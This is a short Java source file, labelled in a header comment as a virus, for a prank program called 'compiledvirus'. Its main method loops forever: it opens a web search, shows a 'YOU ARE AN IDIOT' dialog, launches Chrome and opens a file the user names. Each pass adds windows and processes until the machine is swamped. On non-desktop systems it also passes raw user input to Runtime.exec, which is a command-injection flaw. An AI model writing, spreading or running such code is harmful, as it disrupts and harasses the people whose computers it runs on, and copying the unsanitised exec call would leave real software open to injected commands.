/*
*
*
*
*
DO NOT RUN IT IS A VIRUS..
*
*
*
*/
import java.awt.Desktop;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;//success......
import java.util.*;//working..........
import javax.swing.JOptionPane;
import java.awt.*;
import java.io.File;
public class compiledvirus{
	/*in web u can't search a sentence with space in it >server won't understand
	so all the space(s) are converted to '+'*/
	public static String string_search_in_web(String hell){
     String well;
     if(hell.contains(" "))
     	well=hell.replace(' ','+');
     else
     	well=hell;
     return well;
	}
	public static void open_certain_file(String pes){
		 try{
       	Desktop.getDesktop().open(new File(pes));
       }
       catch(IOException e){e.printStackTrace();}
	}
	public static void open_any_file(){
		 String path="C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
       try{
       	Desktop.getDesktop().open(new File(path));
       }
       catch(IOException e){e.printStackTrace();}
	}
	public static void one(String str){
		String newurl="http://google.com/search?q="+(string_search_in_web(str));
			try{
		if(Desktop.isDesktopSupported()){
		Desktop d=Desktop.getDesktop();
		d.browse(new URI(newurl)); }
		else{
			String myOS=System.getProperty("os.name").toLowerCase();
			Runtime r=Runtime.getRuntime();
			if(myOS.contains("mac")){
				r.exec("open "+str);
			}
			else if(myOS.contains("nix")|| myOS.contains("nux")){
				r.exec("xdg-open "+str);
			}
		}
	}
	catch(IOException | URISyntaxException e){e.getMessage();}	
	}
	public static void two(){
		JOptionPane.showMessageDialog(null,"you still are an idiot..","YOU ARE AN IDIOT",1);
	}
	public static void main(String ar[]){
        Scanner nrt=new Scanner(System.in);
		System.out.println("what do you want to search?");
		System.out.println("enter a path..we will open that .exe or a file..");
		String search=nrt.nextLine();
		String pe=nrt.nextLine();
		for(;;){
		one(search);
		two();
		open_any_file();//only open a certain file..
		open_certain_file(pe);//provided by user..
		}
        }
    }